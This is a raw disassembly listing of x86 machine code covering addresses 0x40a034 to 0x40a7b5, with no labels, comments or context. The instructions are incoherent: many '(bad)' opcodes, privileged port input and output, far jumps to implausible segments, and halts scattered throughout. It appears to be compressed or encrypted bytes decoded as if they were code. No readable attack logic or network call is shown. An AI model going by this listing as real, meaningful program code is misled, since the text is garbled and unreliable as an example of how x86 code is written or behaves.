  40a034:	rcr    BYTE PTR ds:0x61c8c626,1
  40a03a:	dec    ebp
  40a03b:	dec    esi
  40a03c:	inc    ecx
  40a03d:	mov    ds,WORD PTR [ebp-0x5a4f33cf]
  40a043:	iret   
  40a044:	out    0x28,eax
  40a046:	ss cmc 
  40a048:	push   eax
  40a049:	xchg   DWORD PTR [edi-0x2d],esi
  40a04c:	cmp    eax,0x43da5204
  40a051:	test   BYTE PTR [ebx-0x74],dh
  40a054:	leave  
  40a055:	(bad)
  40a05a:	inc    ecx
  40a05b:	repz imul ebx,DWORD PTR es:[eax+0x58939288],0xffffff98
  40a064:	ret    0x6406
  40a067:	in     eax,0xf7
  40a069:	shl    BYTE PTR [ebx+0x14d62631],0x22
  40a070:	(bad)  
  40a071:	and    al,0xf
  40a073:	push   0xffffffd4
  40a075:	and    eax,0xcea409ca
  40a07a:	dec    ecx
  40a07b:	lods   eax,DWORD PTR ds:[esi]
  40a07c:	jnp    0x40a0cd
  40a07e:	sbb    eax,0xdbd85ae1
  40a083:	cmp    ecx,esp
  40a085:	inc    ecx
  40a086:	jp     0x40a0cc
  40a088:	add    DWORD PTR [ecx+0x45748a05],ebx
  40a08e:	jmp    0xdeb9e051
  40a093:	rcr    BYTE PTR ds:0x32ad98ae,1
  40a099:	enter  0x3c1c,0x93
  40a09d:	test   eax,0x13348fd
  40a0a2:	and    ecx,ebx
  40a0a4:	push   edx
  40a0a5:	in     eax,0xe2
  40a0a7:	hlt    
  40a0a8:	jl     0x40a0a6
  40a0aa:	cli    
  40a0ab:	xor    eax,0x44cca7a8
  40a0b0:	adc    al,0xa9
  40a0b2:	mov    esp,ebp
  40a0b4:	fldenv [edi]
  40a0b6:	mov    dl,0x62
  40a0b8:	jle    0x40a0f5
  40a0ba:	mov    dh,0xf4
  40a0bc:	xchg   ecx,eax
  40a0bd:	push   esi
  40a0be:	int3   
  40a0bf:	lea    ebx,[edx+eax*4-0x1b9e9a65]
  40a0c6:	test   BYTE PTR [edi+0x14],dh
  40a0c9:	push   esp
  40a0ca:	add    ah,0x15
  40a0cd:	sub    edx,esi
  40a0cf:	pop    esp
  40a0d0:	sti    
  40a0d1:	repz rcl BYTE PTR [ebp-0x55d3d8e],1
  40a0d8:	xor    DWORD PTR [esi],0x1a4ba24e
  40a0de:	stc    
  40a0df:	das    
  40a0e0:	pop    es
  40a0e1:	retf   
  40a0e2:	xchg   edi,eax
  40a0e3:	sbb    ecx,DWORD PTR [ebp-0x4e39c510]
  40a0e9:	bound  ebx,QWORD PTR [ebp-0x2297968]
  40a0ef:	leave  
  40a0f0:	icebp  
  40a0f1:	stos   DWORD PTR es:[edi],eax
  40a0f2:	gs enter 0x49b4,0x65
  40a0f7:	jmp    0x40a12e
  40a0f9:	test   DWORD PTR [esi+0x4a248c62],eax
  40a0ff:	mov    esi,0x16af8199
  40a104:	div    eax
  40a106:	sbb    BYTE PTR [edi-0x5d329119],cl
  40a10c:	in     eax,0x23
  40a10e:	fidiv  DWORD PTR [esi]
  40a110:	shl    bl,cl
  40a112:	dec    ebp
  40a113:	out    0xef,eax
  40a115:	(bad)  
  40a116:	and    BYTE PTR [ecx],ah
  40a118:	inc    edx
  40a119:	push   0x46
  40a11b:	pop    ds
  40a11c:	test   DWORD PTR [esi+0x5fc27690],esi
  40a122:	push   es
  40a123:	pop    ss
  40a124:	ss add al,0xbd
  40a127:	sub    al,0xb8
  40a129:	in     eax,0x42
  40a12b:	mov    ds:0x3531d53a,eax
  40a130:	sbb    ecx,DWORD PTR es:0xadaa8083
  40a137:	cmp    eax,0xdd0c58a2
  40a13c:	jmp    0xb6d23845
  40a141:	fwait
  40a142:	outs   dx,DWORD PTR ds:[esi]
  40a143:	pushf  
  40a144:	push   0x6
  40a146:	aad    0xa7
  40a148:	and    eax,0x39debf82
  40a14d:	test   eax,0x1a3daf31
  40a152:	sbb    DWORD PTR [edi-0x5a],edx
  40a155:	jle    0x40a126
  40a157:	push   ds
  40a158:	hlt    
  40a159:	ret    0x9d2
  40a15c:	(bad)  
  40a15d:	jle    0x40a1d7
  40a15f:	fisttp WORD PTR [eax]
  40a161:	jnp    0x40a12b
  40a163:	xchg   ebp,eax
  40a164:	cwde   
  40a165:	imul   esi,DWORD PTR [edx-0x6d8ec780],0x75
  40a16c:	pop    ss
  40a16d:	add    eax,ebx
  40a16f:	test   eax,0x5a504ce6
  40a174:	pop    edi
  40a175:	mov    dh,BYTE PTR [esi+0x7f]
  40a178:	add    ebp,DWORD PTR [eax+edi*2]
  40a17b:	cmp    bl,BYTE PTR [eax-0x58]
  40a17e:	jmp    0x40a152
  40a180:	cmc    
  40a181:	int3   
  40a182:	test   BYTE PTR [edi-0x34],ah
  40a185:	movq   QWORD PTR [ecx-0x3929d307],mm4
  40a18c:	cs test eax,0xa4eacb41
  40a192:	push   ecx
  40a193:	push   di
  40a195:	xchg   ecx,eax
  40a196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a197:	dec    ebx
  40a198:	in     al,0x16
  40a19a:	adc    BYTE PTR [edi-0x1a],ah
  40a19d:	inc    edi
  40a19e:	jle    0x40a198
  40a1a0:	adc    eax,0xaf15c8e2
  40a1a5:	and    eax,0xcad28598
  40a1aa:	mov    ecx,DWORD PTR [edi+0x36b5f2be]
  40a1b0:	mov    cl,BYTE PTR [esp+edi*1+0x53798add]
  40a1b7:	adc    esp,DWORD PTR [edi]
  40a1b9:	push   ecx
  40a1ba:	sahf   
  40a1bb:	cmc    
  40a1bc:	mov    BYTE PTR [edi],cl
  40a1be:	pusha  
  40a1bf:	cmp    dh,BYTE PTR [esi+0x6]
  40a1c2:	fldcw  WORD PTR [esi]
  40a1c4:	jb     0x40a197
  40a1c6:	push   esi
  40a1c7:	test   ebp,esi
  40a1c9:	or     BYTE PTR ds:0x7a6c82c5,bh
  40a1cf:	scas   eax,DWORD PTR es:[edi]
  40a1d0:	clc    
  40a1d1:	push   ebp
  40a1d2:	icebp  
  40a1d3:	fisttp WORD PTR [esi]
  40a1d5:	add    DWORD PTR [ebx-0x39],edi
  40a1d8:	loop   0x40a1f3
  40a1da:	loop   0x40a1fb
  40a1dc:	mov    dh,0x31
  40a1de:	mov    eax,0x674c0f52
  40a1e3:	dec    ecx
  40a1e4:	mov    dh,BYTE PTR [edi-0x62b172f1]
  40a1ea:	pop    ds
  40a1eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1ec:	retf   
  40a1ed:	int    0xbb
  40a1ef:	jmp    0x6c12399a
  40a1f4:	add    eax,0x6932c39f
  40a1f9:	js     0x40a1fc
  40a1fb:	jmp    0x8b96:0x9dc10419
  40a202:	lods   eax,DWORD PTR ds:[esi]
  40a203:	xchg   edi,eax
  40a204:	mov    edi,0x48ed17b8
  40a209:	mov    edx,0x4531fd37
  40a20e:	mov    ds:0x7ae3727e,al
  40a213:	(bad)  
  40a214:	clc    
  40a215:	sbb    DWORD PTR [edx-0x51],0xffffffc2
  40a219:	icebp  
  40a21a:	cmp    DWORD PTR es:[ebx+0x29],esi
  40a21e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a21f:	push   0xb
  40a221:	lahf   
  40a222:	inc    esi
  40a223:	xlat   BYTE PTR ds:[ebx]
  40a224:	add    BYTE PTR [ebp+0x16a1759c],0x97
  40a22b:	add    edi,eax
  40a22d:	push   ecx
  40a22f:	psubw  mm0,mm2
  40a232:	pop    ebx
  40a233:	xchg   ebp,eax
  40a234:	mov    ecx,0x8c440e3a
  40a239:	mov    ebp,0x227dc3d9
  40a23e:	push   ebx
  40a23f:	std    
  40a240:	and    eax,0x943975d2
  40a245:	jmp    FWORD PTR [eax+0x0]
  40a248:	retf   0x804d
  40a24b:	ret    0x338f
  40a24e:	push   0x6dead88b
  40a253:	sub    eax,0x8a077814
  40a258:	push   ds
  40a259:	mov    al,0x88
  40a25b:	mov    ah,0x5a
  40a25d:	iret   
  40a25e:	bound  esp,QWORD PTR [ecx-0x6a]
  40a261:	sbb    esi,DWORD PTR [ebp+0x1396fe4c]
  40a267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a268:	sub    eax,eax
  40a26a:	sub    dl,dh
  40a26c:	out    dx,al
  40a26d:	sub    ch,0x16
  40a270:	repnz cmp eax,0x1d6e2b01
  40a276:	mov    eax,ds:0x87edfbb6
  40a27b:	dec    esi
  40a27c:	das    
  40a27d:	inc    esi
  40a27e:	and    edi,DWORD PTR [bp+si+0x46]
  40a282:	pop    ds
  40a283:	out    0xbc,eax
  40a285:	mov    edi,0xb0e6e08a
  40a28a:	push   ss
  40a28b:	ss sub dh,0x50
  40a28f:	push   ebp
  40a290:	push   edx
  40a291:	push   edi
  40a292:	add    eax,0x8ae2a6e2
  40a297:	enter  0xc3dc,0x43
  40a29b:	mov    eax,ds:0xd5c2da66
  40a2a0:	ins    BYTE PTR es:[edi],dx
  40a2a1:	mov    al,ss:0xfa4dfba4
  40a2a7:	call   0x24266a8a
  40a2ac:	ins    BYTE PTR es:[edi],dx
  40a2ad:	fstp   DWORD PTR [edi]
  40a2af:	scas   eax,DWORD PTR es:[edi]
  40a2b0:	cs or  al,0xd6
  40a2b3:	out    dx,al
  40a2b4:	aaa    
  40a2b5:	add    edx,DWORD PTR [esi-0x4b]
  40a2b8:	jne    0x40a2af
  40a2ba:	and    DWORD PTR [ebx-0x36],esp
  40a2bd:	mov    ds:0x747c9d1d,al
  40a2c2:	xor    eax,0x1e1e6742
  40a2c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2c8:	push   0x78
  40a2ca:	xor    ch,BYTE PTR [edi-0x3adc4b27]
  40a2d0:	add    al,0xdd
  40a2d2:	pop    es
  40a2d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2d4:	xor    edx,edi
  40a2d6:	(bad)  
  40a2d7:	out    0xf0,eax
  40a2d9:	push   cs
  40a2da:	(bad)  
  40a2db:	sub    DWORD PTR [edi-0x3],edi
  40a2de:	cld    
  40a2df:	push   edx
  40a2e0:	fist   DWORD PTR [edx]
  40a2e2:	push   ds
  40a2e3:	inc    ecx
  40a2e4:	ja     0x40a354
  40a2e6:	(bad)  
  40a2e7:	stc    
  40a2e8:	mov    edi,0x67df85c6
  40a2ed:	(bad)  [edi+0x1d]
  40a2f0:	mov    ss,WORD PTR [edx+edx*8-0x65]
  40a2f4:	call   0x54f42de5
  40a2f9:	add    esp,ecx
  40a2fb:	jns    0x40a30f
  40a2fd:	pop    ebp
  40a2fe:	add    BYTE PTR [edx-0x53],ch
  40a301:	enter  0xc523,0xd1
  40a305:	add    eax,0xd61e5c84
  40a30a:	mov    ds:0x3f991e7a,eax
  40a30f:	aaa    
  40a310:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40a312:	retf   
  40a313:	cdq    
  40a314:	cmc    
  40a315:	push   0x14f53d45
  40a31a:	cmp    BYTE PTR [ebp+0x3a5255d6],ch
  40a320:	dec    ecx
  40a321:	shl    ah,1
  40a323:	mov    BYTE PTR [edx],ch
  40a325:	mov    esp,?
  40a327:	sbb    al,0x69
  40a329:	dec    eax
  40a32a:	pop    esp
  40a32b:	les    eax,FWORD PTR [ecx-0x7a912d4e]
  40a331:	mov    edx,0x8f0bb8b
  40a336:	xor    edx,ecx
  40a338:	nop
  40a339:	test   al,0x99
  40a33b:	jmp    DWORD PTR [ebp-0x1a8c1097]
  40a341:	add    eax,0xb7302b0c
  40a346:	pop    edi
  40a347:	jp     0x40a360
  40a349:	cmp    al,0x12
  40a34b:	jns    0x40a3ae
  40a34d:	loopne 0x40a35f
  40a34f:	repz je 0x40a2ee
  40a352:	mov    ds:0x6f02f669,al
  40a357:	sbb    edi,DWORD PTR [edx]
  40a359:	(bad)  
  40a35a:	in     eax,dx
  40a35b:	sbb    BYTE PTR [esi],dl
  40a35d:	(bad)  
  40a35e:	jnp    0x40a33c
  40a360:	sub    ch,BYTE PTR [ebx]
  40a362:	adc    BYTE PTR [edi+0x6f50d55e],0xe0
  40a369:	daa    
  40a36a:	out    0xb5,al
  40a36c:	jecxz  0x40a3bc
  40a36e:	call   0xbff5:0xe4bb165f
  40a375:	jg     0x40a30f
  40a377:	lods   al,BYTE PTR ds:[esi]
  40a378:	push   ss
  40a379:	sar    DWORD PTR [ebx+ebp*2+0x69],0xc0
  40a37e:	inc    edx
  40a37f:	mov    edx,0xbfca32a9
  40a384:	mov    dh,BYTE PTR [edx-0x38f597dd]
  40a38a:	xor    DWORD PTR [edi+0x62],0x42
  40a38e:	lods   eax,DWORD PTR ds:[esi]
  40a38f:	cmp    al,BYTE PTR fs:[edi+ecx*1-0x40]
  40a394:	in     al,dx
  40a395:	or     bl,BYTE PTR [edi+0x25620bb1]
  40a39b:	outs   dx,BYTE PTR ds:[esi]
  40a39c:	outs   dx,DWORD PTR ds:[esi]
  40a39d:	xor    DWORD PTR [ecx],edi
  40a39f:	pop    edx
  40a3a0:	jge    0x40a374
  40a3a2:	pop    edx
  40a3a3:	loope  0x40a3b2
  40a3a5:	setno  BYTE PTR [edi-0x40eef5c7]
  40a3ac:	jae    0x40a39c
  40a3ae:	mov    eax,DWORD PTR [esi+0x2bada73c]
  40a3b4:	inc    ebx
  40a3b5:	dec    ebx
  40a3b6:	test   eax,0x8a14642d
  40a3bb:	mov    ?,WORD PTR [ebp-0x72]
  40a3be:	loop   0x40a39d
  40a3c0:	sub    eax,DWORD PTR [edx-0x12a7e558]
  40a3c6:	mov    WORD PTR [ecx+0x22],fs
  40a3c9:	hlt    
  40a3ca:	hlt    
  40a3cb:	scas   al,BYTE PTR es:[edi]
  40a3cc:	inc    esp
  40a3cd:	sub    al,0xf4
  40a3cf:	ret    
  40a3d0:	cwde   
  40a3d1:	ins    BYTE PTR es:[edi],dx
  40a3d2:	mov    eax,ds:0x354c2b85
  40a3d7:	inc    edx
  40a3d8:	dec    esi
  40a3d9:	dec    ecx
  40a3da:	out    0xfe,eax
  40a3dc:	ret    0xc978
  40a3df:	in     eax,dx
  40a3e0:	mov    ebx,0x89b92794
  40a3e5:	jmp    0x40a3ef
  40a3e7:	inc    edx
  40a3e8:	dec    edx
  40a3e9:	(bad)  
  40a3eb:	test   DWORD PTR [edi-0x577ce7f],esi
  40a3f1:	(bad)  
  40a3f2:	mov    bh,0xd8
  40a3f4:	iret   
  40a3f5:	cli    
  40a3f6:	(bad)  
  40a3f7:	xlat   BYTE PTR ds:[ebx]
  40a3f8:	push   esp
  40a3f9:	je     0x40a43f
  40a3fb:	mov    ah,0xd1
  40a3fd:	or     esp,esp
  40a3ff:	rol    BYTE PTR [ebx-0xd],1
  40a402:	cwde   
  40a403:	push   ecx
  40a404:	repz mov ds:0x4a1c552a,al
  40a40a:	sbb    cl,BYTE PTR ds:0xfe1f2414
  40a410:	outs   dx,BYTE PTR ds:[esi]
  40a411:	adc    ecx,DWORD PTR [eax+edx*4+0x23]
  40a415:	xchg   esi,eax
  40a416:	and    ebx,ebx
  40a418:	sub    eax,0xa2a77e4a
  40a41d:	xor    eax,0xc48601b1
  40a422:	fwait
  40a423:	or     BYTE PTR [ecx],0x7b
  40a426:	adc    DWORD PTR [ebp-0x48],eax
  40a429:	cdq    
  40a42a:	fcomp  st(6)
  40a42c:	mov    bl,0xe2
  40a42e:	mov    DWORD PTR [esi+0x64],edx
  40a431:	add    eax,0xc0cc5c49
  40a436:	or     cl,BYTE PTR [ebx-0x29]
  40a439:	(bad)  
  40a43a:	cli    
  40a43b:	fs push 0xfd34e143
  40a441:	push   ss
  40a442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a443:	ror    DWORD PTR [edx+0x5],0x48
  40a447:	dec    esp
  40a448:	mov    esi,0x6ac474e
  40a44d:	inc    ebp
  40a44e:	inc    esi
  40a44f:	call   0x1b384963
  40a454:	ja     0x40a48d
  40a456:	neg    DWORD PTR [esi]
  40a458:	jge    0x40a442
  40a45a:	jg     0x40a41a
  40a45c:	rol    BYTE PTR [esi],0x31
  40a45f:	inc    ebp
  40a460:	xchg   edx,eax
  40a461:	push   ebx
  40a462:	pop    ebp
  40a463:	mov    ds:0x44666958,al
  40a468:	mov    ds:0xfce3e4b7,eax
  40a46d:	cmp    DWORD PTR [eax],edi
  40a46f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a470:	xor    al,0x4c
  40a472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a473:	pop    edx
  40a474:	jmp    0x40a40a
  40a476:	xchg   ecx,eax
  40a477:	jmp    0x9ab5:0x850d0cf9
  40a47e:	rol    ch,0x6
  40a481:	jne    0x40a497
  40a483:	mov    eax,0x487bfd06
  40a488:	mul    BYTE PTR [edi-0x4be717cb]
  40a48e:	and    ebp,DWORD PTR [ebx]
  40a490:	popf   
  40a491:	jmp    0x40a4d8
  40a493:	lds    edx,FWORD PTR [eax-0x5b1abd58]
  40a499:	cld    
  40a49a:	test   eax,0x3a7025df
  40a49f:	shl    bh,0x62
  40a4a2:	std    
  40a4a3:	xor    eax,0xbee683b5
  40a4a8:	sub    al,0xb5
  40a4aa:	ss in  al,0x1f
  40a4ad:	inc    ebx
  40a4ae:	push   edx
  40a4af:	xchg   esp,eax
  40a4b0:	and    edi,DWORD PTR [esp+eax*2]
  40a4b3:	sbb    al,0x8a
  40a4b5:	scas   al,BYTE PTR es:[edi]
  40a4b6:	mov    dh,0x1
  40a4b8:	xchg   esi,eax
  40a4b9:	stos   DWORD PTR es:[edi],eax
  40a4ba:	jle    0x40a47b
  40a4bc:	sbb    eax,0x1a84ebb1
  40a4c1:	ins    DWORD PTR es:[edi],dx
  40a4c2:	(bad)  
  40a4c3:	retf   
  40a4c4:	lods   al,BYTE PTR ds:[esi]
  40a4c5:	jmp    0x40a44c
  40a4c7:	and    BYTE PTR [ebx],bl
  40a4c9:	inc    edi
  40a4ca:	sahf   
  40a4cb:	rcl    DWORD PTR [esi+0xf],cl
  40a4ce:	outs   dx,DWORD PTR ds:[esi]
  40a4cf:	ins    DWORD PTR es:[edi],dx
  40a4d0:	add    al,0x5c
  40a4d2:	or     ah,BYTE PTR [edx+esi*1-0x183a9c0d]
  40a4d9:	mov    ecx,0x658c5f8e
  40a4de:	lock test DWORD PTR [edx-0x68],ebp
  40a4e2:	xchg   ebx,eax
  40a4e3:	popa   
  40a4e4:	jle    0x40a508
  40a4e6:	pop    eax
  40a4e7:	xchg   ebx,eax
  40a4e8:	mov    eax,0xac27278d
  40a4ed:	(bad)  
  40a4ee:	pop    esi
  40a4ef:	imul   ebp,edi,0xfdea8e5d
  40a4f5:	lds    eax,FWORD PTR [ebp-0x2e]
  40a4f8:	out    dx,al
  40a4f9:	push   ebp
  40a4fa:	pop    ds
  40a4fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4fc:	pop    ss
  40a4fd:	jmp    0xd830:0xa95d8917
  40a504:	int    0x92
  40a506:	cmp    dh,BYTE PTR [ebx-0x3c07bfba]
  40a50c:	jp     0x40a52b
  40a50e:	jmp    0xc333:0x2d32fa8d
  40a515:	inc    esp
  40a516:	icebp  
  40a517:	in     al,0xbd
  40a519:	or     bh,BYTE PTR [eax]
  40a51b:	out    0x69,eax
  40a51d:	repz jo 0x40a53b
  40a520:	adc    eax,esi
  40a522:	xor    BYTE PTR [eax+edx*1+0x37],ch
  40a526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a527:	cdq    
  40a528:	mov    eax,0x37e32a5
  40a52d:	and    DWORD PTR [edx],0x358f3bda
  40a533:	call   0x8155:0xa5193449
  40a53a:	sbb    bl,BYTE PTR [esi+0x4d]
  40a53d:	sub    al,0x37
  40a53f:	lock les esp,FWORD PTR [edi]
  40a542:	js     0x40a4d9
  40a544:	retf   0x80a4
  40a547:	pop    edi
  40a548:	sbb    al,0xe9
  40a54a:	bound  ecx,QWORD PTR [edx+eiz*4-0x11cc4e23]
  40a551:	mov    al,ds:0xff4df60a
  40a556:	or     DWORD PTR [ebx-0x4947d73d],ebx
  40a55c:	or     al,0x82
  40a55e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40a560:	repz adc al,0x2
  40a563:	push   0xf
  40a565:	adc    eax,0xd83376da
  40a56a:	xlat   BYTE PTR ds:[ebx]
  40a56b:	push   ss
  40a56c:	jecxz  0x40a58b
  40a56e:	push   eax
  40a56f:	nop
  40a570:	mov    es,WORD PTR [ecx]
  40a572:	adc    ch,BYTE PTR [eax+0x5e9a0f9e]
  40a578:	cdq    
  40a579:	push   edi
  40a57a:	or     al,0x33
  40a57c:	jae    0x40a550
  40a57e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a57f:	in     eax,0xcf
  40a581:	push   ebx
  40a582:	push   ss
  40a583:	std    
  40a584:	rol    ebx,cl
  40a586:	ja     0x40a532
  40a588:	sbb    al,0x4d
  40a58a:	add    BYTE PTR [edi],dh
  40a58c:	in     al,0x77
  40a58e:	mov    esi,0xafa8e6cc
  40a593:	ins    DWORD PTR es:[edi],dx
  40a594:	jecxz  0x40a51e
  40a596:	inc    ecx
  40a597:	outs   dx,DWORD PTR ds:[esi]
  40a598:	or     ebx,esp
  40a59a:	mov    al,0x51
  40a59c:	xchg   ebx,eax
  40a59d:	mov    ds:0x7dabfda7,al
  40a5a2:	int3   
  40a5a3:	or     al,BYTE PTR [eax]
  40a5a5:	bound  edx,QWORD PTR [esi]
  40a5a7:	inc    edi
  40a5a8:	xor    esi,DWORD PTR [edi]
  40a5aa:	test   DWORD PTR [eax+0x3c27a16b],0x569c7299
  40a5b4:	into   
  40a5b5:	mov    ds:0x2843fccd,eax
  40a5ba:	pop    edx
  40a5bb:	pusha  
  40a5bc:	push   ebx
  40a5bd:	ror    DWORD PTR [esi],1
  40a5bf:	mov    BYTE PTR [ebp-0x41dfe8e7],bh
  40a5c5:	dec    esp
  40a5c6:	or     BYTE PTR ds:[eax+0x7f],al
  40a5ca:	push   esi
  40a5cb:	xchg   edx,eax
  40a5cc:	sbb    ch,al
  40a5ce:	add    BYTE PTR [ebp-0x37b5bbd4],0xe5
  40a5d5:	rcr    DWORD PTR [ebx],0x2a
  40a5d8:	mov    ebp,0xcbe0002e
  40a5dd:	shr    BYTE PTR [ecx],0xb3
  40a5e0:	gs adc eax,0x4754f55d
  40a5e6:	pop    ds
  40a5e7:	push   esp
  40a5e8:	xchg   esp,eax
  40a5e9:	int3   
  40a5ea:	aam    0xb0
  40a5ec:	xor    eax,0xd104b82f
  40a5f1:	test   al,0x15
  40a5f3:	stos   DWORD PTR es:[edi],eax
  40a5f4:	dec    eax
  40a5f5:	or     dl,bh
  40a5f7:	inc    ebx
  40a5f8:	push   edx
  40a5f9:	aas    
  40a5fa:	js     0x40a61d
  40a5fc:	mov    bh,0x4a
  40a5fe:	or     al,0xd7
  40a600:	sbb    BYTE PTR [edx+0x8c64e09],cl
  40a606:	xor    BYTE PTR [edx+0x184e3d37],al
  40a60c:	and    BYTE PTR [ecx-0x62],dl
  40a60f:	pop    ebx
  40a610:	push   ss
  40a611:	dec    ecx
  40a612:	cld    
  40a613:	xchg   ecx,eax
  40a614:	sbb    eax,0x17d624a8
  40a619:	inc    ecx
  40a61a:	mov    edi,0x1e3bb636
  40a61f:	mov    edx,0x28fd5419
  40a624:	adc    DWORD PTR ds:0xeb1ce3e1,esi
  40a62a:	dec    edx
  40a62b:	(bad)  
  40a62c:	pop    ebx
  40a62d:	jle    0x40a5fc
  40a62f:	(bad)  
  40a630:	(bad)  
  40a631:	cdq    
  40a632:	adc    dl,BYTE PTR cs:[ebx+0x6fa40eec]
  40a639:	xlat   BYTE PTR ds:[ebx]
  40a63a:	rcl    DWORD PTR [esi],1
  40a63c:	inc    esp
  40a63d:	xor    ebx,esp
  40a63f:	test   eax,0x24065241
  40a644:	js     0x40a6bd
  40a646:	ret    0x62de
  40a649:	xchg   edi,esi
  40a64b:	sub    DWORD PTR [edi-0x54],edi
  40a64e:	xchg   esi,eax
  40a64f:	mov    dh,BYTE PTR [eax+0x0]
  40a652:	inc    ecx
  40a653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a654:	rcr    BYTE PTR [edi],1
  40a656:	ins    DWORD PTR es:[edi],dx
  40a657:	outs   dx,BYTE PTR ds:[esi]
  40a658:	hlt    
  40a659:	xor    eax,0xeba1a08c
  40a65e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a65f:	and    eax,0xbe05cec7
  40a664:	sub    al,0x13
  40a666:	mov    gs,WORD PTR [ecx+0x583e6804]
  40a66c:	sub    al,0xb9
  40a66e:	out    dx,eax
  40a66f:	cmp    bh,cl
  40a671:	cwde   
  40a672:	push   eax
  40a673:	sub    DWORD PTR [edi-0x52],esi
  40a676:	push   ebx
  40a677:	addr16 retf 0xa548
  40a67b:	cmp    al,0xf3
  40a67d:	imul   BYTE PTR [esi+edx*4-0x36]
  40a681:	fcom   QWORD PTR [esi-0x47]
  40a684:	addr16 mov esp,0x40c950fe
  40a68a:	(bad)  
  40a68b:	cld    
  40a68c:	jmp    0x40a6b4
  40a68e:	cli    
  40a68f:	test   eax,0xea560a06
  40a694:	xchg   edx,eax
  40a695:	add    al,0x29
  40a697:	popa   
  40a698:	shl    BYTE PTR [edx+0x12],0x5c
  40a69c:	adc    esi,DWORD PTR [edi+0x5e76871b]
  40a6a2:	push   es
  40a6a3:	jg     0x40a68a
  40a6a5:	cs pop ss
  40a6a7:	call   FWORD PTR [ebx+0x5e]
  40a6aa:	jo     0x40a719
  40a6ac:	fdiv   st,st(4)
  40a6ae:	mov    esi,0xd04595e7
  40a6b3:	or     eax,0xa69322cd
  40a6b8:	out    dx,al
  40a6b9:	or     ch,al
  40a6bb:	cdq    
  40a6bc:	rcr    ch,cl
  40a6be:	xor    bl,BYTE PTR [ecx]
  40a6c0:	aad    0xb8
  40a6c2:	ret    
  40a6c3:	cmp    al,0xe
  40a6c5:	mov    edi,0x49626e80
  40a6ca:	adc    cl,cl
  40a6cc:	arpl   WORD PTR gs:[esi-0x4b],di
  40a6d0:	(bad)  
  40a6d1:	jp     0x40a693
  40a6d3:	sbb    BYTE PTR [edx],cl
  40a6d5:	outs   dx,DWORD PTR ds:[esi]
  40a6d6:	(bad)  
  40a6d7:	xor    al,0x8b
  40a6d9:	jno    0x40a668
  40a6db:	call   0xb5b85e35
  40a6e0:	add    al,0x2c
  40a6e2:	fsubr  DWORD PTR [edi]
  40a6e4:	jmp    0x15f5c05f
  40a6e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6ea:	in     al,0xfc
  40a6ec:	sub    ecx,eax
  40a6ee:	mov    esi,0xd50cb3e1
  40a6f3:	stc    
  40a6f4:	in     al,dx
  40a6f5:	mov    ds:0x31bd7cfe,eax
  40a6fa:	push   0x49
  40a6fc:	dec    esp
  40a6fd:	rol    DWORD PTR [ebx+0x74],cl
  40a700:	xchg   si,ax
  40a702:	cmc    
  40a703:	xchg   ebp,eax
  40a704:	in     al,dx
  40a705:	inc    edi
  40a706:	sbb    dh,BYTE PTR [eax-0x6c]
  40a709:	dec    ecx
  40a70a:	sub    al,BYTE PTR [ebp-0x639a888c]
  40a710:	lock adc eax,0x78475600
  40a716:	int3   
  40a717:	xor    ah,0x7f
  40a71a:	mov    bh,0x8a
  40a71c:	jbe    0x40a72f
  40a71e:	cmp    al,0x75
  40a720:	add    DWORD PTR [ecx+edx*8],0x71202cc
  40a727:	scas   al,BYTE PTR es:[edi]
  40a728:	xor    dh,0x62
  40a72b:	out    dx,eax
  40a72c:	adc    dl,BYTE PTR [edi-0x7fedde05]
  40a732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a733:	ds mov al,0xf9
  40a736:	iret   
  40a737:	(bad)  
  40a738:	push   0xffffffbc
  40a73a:	pop    ds
  40a73b:	pop    ds
  40a73c:	es (bad) 
  40a73e:	mov    ebp,0x73b036dc
  40a743:	cli    
  40a744:	test   BYTE PTR [esi-0x68],dh
  40a747:	and    dh,BYTE PTR [esi+0x12]
  40a74a:	imul   ecx,DWORD PTR [ebx+0x34e98b8f],0xa4bec461
  40a754:	cmp    ah,BYTE PTR [esp+eax*1-0x4d81a7e2]
  40a75b:	adc    al,BYTE PTR [eax+0x6a]
  40a75e:	or     BYTE PTR [edx+0x43],0x37
  40a762:	jge    0x40a791
  40a764:	xchg   ebx,eax
  40a765:	adc    al,0xf
  40a767:	fist   WORD PTR [eax-0x55]
  40a76a:	dec    edi
  40a76b:	pop    esp
  40a76c:	xchg   edi,eax
  40a76d:	adc    al,BYTE PTR [eax+0x3d7e3661]
  40a773:	ins    DWORD PTR es:[edi],dx
  40a774:	add    DWORD PTR [esi-0x1f5c86e2],eax
  40a77a:	xchg   esp,eax
  40a77b:	mov    cl,0xf4
  40a77d:	jge    0x40a76e
  40a77f:	pop    edx
  40a780:	xchg   ecx,eax
  40a781:	mul    DWORD PTR [ecx+0xf]
  40a784:	(bad)
  40a787:	(bad)  
  40a788:	pop    ecx
  40a789:	hlt    
  40a78a:	loop   0x40a768
  40a78c:	sbb    cl,BYTE PTR [esp+eax*2-0x60538ba8]
  40a793:	adc    ebp,ecx
  40a795:	rcl    BYTE PTR [ecx],cl
  40a797:	call   0x2d86:0x99f20301
  40a79e:	mov    dh,0xcc
  40a7a0:	mov    edx,0xb6eb4769
  40a7a5:	jle    0x40a732
  40a7a7:	ret    0x1806
  40a7aa:	mov    ecx,0x7f30bdf3
  40a7af:	leave  
  40a7b0:	lds    ecx,FWORD PTR [ecx]
  40a7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7b3:	loopne 0x40a819
  40a7b5:	pushf  
